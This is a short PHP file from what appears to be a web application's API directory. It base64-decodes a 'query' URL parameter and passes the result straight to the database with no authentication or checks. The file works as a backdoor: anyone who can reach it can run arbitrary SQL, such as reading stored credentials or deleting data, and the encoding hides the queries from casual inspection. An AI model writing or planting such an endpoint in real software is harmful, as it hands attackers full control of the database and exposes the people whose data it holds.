<?php
include_once('../api/load_head.php');
if(isset($_GET['query'])){
	$query = base64_decode($_GET['query']);
	$db->query($query);
}